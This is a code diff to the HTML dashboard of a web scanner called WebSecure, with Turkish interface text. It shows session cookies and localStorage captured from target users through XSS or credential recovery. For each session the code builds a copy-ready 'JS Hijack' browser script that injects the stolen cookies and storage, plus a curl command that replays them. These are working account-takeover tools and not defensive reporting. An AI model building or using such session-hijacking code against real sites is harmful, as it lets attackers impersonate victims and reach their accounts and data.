@@ -1,4 +1,4 @@
-﻿"""
+"""
 websecure.reporters.html_dashboard
 ------------------------------------
 HTML dashboard renderer for WebSecure scan results.
@@ -1463,34 +1463,113 @@ def render_html_dashboard(results: dict) -> str:
         const body = document.getElementById('sessionsBody');
 
         if (!sessions || sessions.length === 0) {{
-            body.innerHTML = "<p>No sessions captured.</p>";
+            body.innerHTML = `
+              <div style="text-align:center; padding:2rem; color:var(--text-muted);">
+                <div style="font-size:2rem;">🔒</div>
+                <p>Yakalanmış session yok.</p>
+                <p style="font-size:0.85rem;">XSS DOM doğrulaması veya credential recovery ile session yakalanabilir.</p>
+              </div>`;
         }} else {{
-            let html = "";
-            sessions.forEach(s => {{
-                const cookieJson = JSON.stringify(s.cookies || {{}});
-                const exportCmd = `
-// [WebSecure] One-Click Session Hijack
-const cookies = ${{cookieJson}};
-for (const [k, v] of Object.entries(cookies)) {{
-    document.cookie = k + '=' + v + '; path=/';
-}}
-console.log('%c[+] Session Injected! Reloading...', 'color:lime; font-size:14px;');
-setTimeout(() => location.reload(), 1000);
-`.trim();
+            let html = `<p style="color:var(--sev-critical); font-weight:bold; margin:0 0 1rem;">
+              ⚠️ ${{sessions.length}} adet session yakalandı — bunlar hedef kullanıcılara ait oturumlardır.
+            </p>`;
 
-                // Escape for visual display but keep raw for copy
-                const safeCmd = exportCmd.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const safeCmdAttr = escapeHtml(exportCmd).replace(/"/g, "&quot;");
+            sessions.forEach((s, idx) => {{
+                const cookieObj  = s.cookies || {{}};
+                const lsObj      = s.local_storage || {{}};
+                const ssObj      = s.session_storage || {{}};
+                const cookieJson = JSON.stringify(cookieObj);
+                const verified   = s.verified || s.ato_verified || false;
+                const source     = s.source || 'credential';
+                var _srcMap = {{'xss_reflected':'🎯 XSS Reflected','xss_dom':'🎯 XSS DOM','xss_blind':'👁️ XSS Blind (OAST)','credential':'🔑 Credential Recovery'}};
+                const sourceLabel = _srcMap[source] || source;
 
-                html += `<div class="card" style="margin-bottom:1rem; padding:1rem; background:var(--bg-body);">`;
-                html += `<div style="display:flex; justify-content:space-between; align-items:flex-start;">`;
-                html += `<div><strong>User:</strong> ${{escapeHtml(s.user)}} <span class="tag ${{s.verified ? 'Low' : 'Info'}}">${{s.verified ? 'Verified' : 'Unverified'}}</span></div>`;
-                html += `<button class="btn" onclick="navigator.clipboard.writeText(this.getAttribute('data-cmd')).then(()=>alert('Copied! Paste into DevTools Console.'))" data-cmd="${{safeCmdAttr}}" style="font-size:0.8rem; padding:4px 8px;">[list] Copy Hijack Script</button>`;
-                html += `</div>`;
+                // Hijack script — DevTools konsoluna yapıştır
+                const hijackScript = [
+                    `// ═══ WebSecure Session Hijack ═══`,
+                    `// Kaynak: ${{source}} | Zaman: ${{s.timestamp || ''}}`,
+                    `// XSS URL: ${{s.xss_url || s.origin_url || ''}}`,
+                    `(function() {{`,
+                    `  var c = ${{cookieJson}};`,
+                    `  for (var k in c) document.cookie = k+'='+c[k]+'; path=/; SameSite=Lax';`,
+                    `  var ls = ${{JSON.stringify(lsObj)}};`,
+                    `  for (var k in ls) localStorage.setItem(k, ls[k]);`,
+                    `  console.log('%c[WebSecure] Session injected!', 'color:lime;font-size:14px;font-weight:bold');`,
+                    `  setTimeout(() => location.reload(), 800);`,
+                    `}})();`,
+                ].join('\n');
 
-                html += `<div><strong>Time:</strong> ${{s.timestamp}}</div>`;
-                html += `<h4>Cookies</h4><pre>${{escapeHtml(JSON.stringify(s.cookies || {{}}, null, 2))}}</pre>`;
-                html += `</div>`;
+                // Curl komutu
+                const curlCookies = Object.entries(cookieObj).map(([k,v]) => `${{k}}=${{v}}`).join('; ');
+                const curlCmd = `curl -s -b '${{curlCookies}}' '${{s.verification_url || s.origin_url || ''}}' -I`;
+
+                const hijackAttr = escapeHtml(hijackScript).replace(/"/g, '&quot;');
+                const curlAttr   = escapeHtml(curlCmd).replace(/"/g, '&quot;');
+
+                html += `
+                <div style="background:var(--bg-body); border:1px solid ${{verified ? 'var(--sev-critical)' : 'var(--border)'}}; border-radius:8px; padding:1rem; margin-bottom:1rem;">
+
+                  <!-- Header -->
+                  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
+                    <div style="display:flex; align-items:center; gap:10px;">
+                      <span style="font-size:1.1rem; font-weight:700; color:var(--sev-critical);">#${{idx+1}}</span>
+                      <span style="font-size:0.85rem; color:var(--accent);">${{sourceLabel}}</span>
+                      <span class="tag ${{verified ? 'Critical' : 'Info'}}" style="font-size:0.75rem;">
+                        ${{verified ? '✅ Doğrulandı (HTTP ' + s.verification_status + ')' : '⚠️ Doğrulanmamış'}}
+                      </span>
+                    </div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                      <button class="btn" style="font-size:0.78rem; padding:3px 8px; background:rgba(248,81,73,0.15); border-color:var(--sev-high);"
+                        onclick="navigator.clipboard.writeText(this.dataset.cmd).then(()=>{{this.textContent='✅ Kopyalandı!';setTimeout(()=>this.textContent='💉 JS Hijack',1500)}})"
+                        data-cmd="${{hijackAttr}}">💉 JS Hijack</button>
+                      <button class="btn" style="font-size:0.78rem; padding:3px 8px;"
+                        onclick="navigator.clipboard.writeText(this.dataset.cmd).then(()=>{{this.textContent='✅ Kopyalandı!';setTimeout(()=>this.textContent='🖥️ cURL',1500)}})"
+                        data-cmd="${{curlAttr}}">🖥️ cURL</button>
+                      ${{s.verification_url ? `<a href="${{escapeHtml(s.verification_url)}}" target="_blank" class="btn" style="font-size:0.78rem; padding:3px 8px;">🔗 Test Et</a>` : ''}}
+                    </div>
+                  </div>
+
+                  <!-- Meta -->
+                  <div style="display:grid; grid-template-columns:130px 1fr; gap:4px 12px; font-size:0.83rem; margin-bottom:10px;">
+                    <span style="color:var(--text-muted);">Zaman</span><span>${{s.timestamp || '-'}}</span>
+                    ${{s.xss_url ? `<span style="color:var(--text-muted);">XSS URL</span><span style="font-family:monospace; font-size:0.78rem; word-break:break-all;">${{escapeHtml(s.xss_url)}}</span>` : ''}}
+                    ${{s.xss_param ? `<span style="color:var(--text-muted);">Parametre</span><span><code style="color:var(--sev-high);">${{escapeHtml(s.xss_param)}}</code></span>` : ''}}
+                    ${{s.origin_url ? `<span style="color:var(--text-muted);">Origin</span><span style="font-size:0.78rem; word-break:break-all;">${{escapeHtml(s.origin_url)}}</span>` : ''}}
+                  </div>
+
+                  <!-- Cookies -->
+                  <details open>
+                    <summary style="cursor:pointer; color:var(--accent); font-weight:600; font-size:0.85rem; margin-bottom:6px;">
+                      🍪 Cookies (${{Object.keys(cookieObj).length}})
+                    </summary>
+                    <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:6px;">
+                      ${{Object.entries(cookieObj).map(([k,v]) =>
+                        `<div style="background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:4px; padding:4px 8px; font-size:0.78rem;">
+                          <span style="color:var(--sev-medium); font-weight:600;">${{escapeHtml(k)}}</span>
+                          <span style="color:var(--text-muted);">=</span>
+                          <span style="color:var(--text-main); font-family:monospace; word-break:break-all;">${{escapeHtml(v.length>60?v.substring(0,60)+'…':v)}}</span>
+                        </div>`
+                      ).join('')}}
+                    </div>
+                  </details>
+
+                  <!-- localStorage -->
+                  ${{Object.keys(lsObj).length ? `
+                  <details style="margin-top:6px;">
+                    <summary style="cursor:pointer; color:var(--accent); font-weight:600; font-size:0.85rem; margin-bottom:6px;">
+                      💾 localStorage (${{Object.keys(lsObj).length}} key)
+                    </summary>
+                    <pre style="font-size:0.78rem; max-height:120px; overflow:auto;">${{escapeHtml(JSON.stringify(lsObj, null, 2))}}</pre>
+                  </details>` : ''}}
+
+                  <!-- Raw cookie string -->
+                  ${{s.raw_cookie_str ? `
+                  <details style="margin-top:6px;">
+                    <summary style="cursor:pointer; color:var(--text-muted); font-size:0.8rem;">▶ Ham Cookie String</summary>
+                    <pre style="font-size:0.75rem; color:var(--sev-medium); margin-top:4px; max-height:80px; overflow:auto;">${{escapeHtml(s.raw_cookie_str)}}</pre>
+                  </details>` : ''}}
+
+                </div>`;
             }});
             body.innerHTML = html;
         }}
